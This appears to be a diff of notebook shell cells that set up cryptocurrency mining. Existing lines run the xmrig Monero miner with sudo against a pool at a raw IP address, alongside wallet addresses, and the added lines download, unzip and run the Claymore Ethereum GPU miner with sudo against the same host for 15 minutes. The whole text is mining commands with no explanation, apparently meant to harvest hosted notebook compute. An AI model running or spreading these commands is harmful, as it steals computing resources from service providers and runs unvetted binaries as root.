@@ -3,3 +3,12 @@
 !cd xmrig-6.12.2 && chmod +x xmrig && sudo ./xmrig -o 88.198.11.177:55443 -O xxxWALLETxxx.0001BC8F:xxxPASSxxx -a rx/0 -t 2
 4AHp5RkuQUYaupQe5vRrnUibtmZtUJGpz65um8AteR7tgp4XbFhvGhg6mgFVXJ6CNb4Sx8K43yshjB9dVXmFSNks3U6LDoK
 0x519244B70dA2834D4544FC42E72bf284743d20C9
+
+
+
+!sudo apt update && sudo apt-get install -y libpci-dev
+!wget https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX.zip
+!unzip Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX.zip
+!cd Claymore.s.Dual.Ethereum.AMD+NVIDIA.GPU.Miner.v15.0.-.LINUX && chmod +x ethdcrminer64 && sudo timeout 15m ./ethdcrminer64 -epool 88.198.11.177:55456 -ewal xxxWALLETxxx -eworker 0001BC8F -epsw xxxPASSxxx -dbg -1 -retrydelay 1 -ftime 55 -erate 1 -allcoins 1
+
+
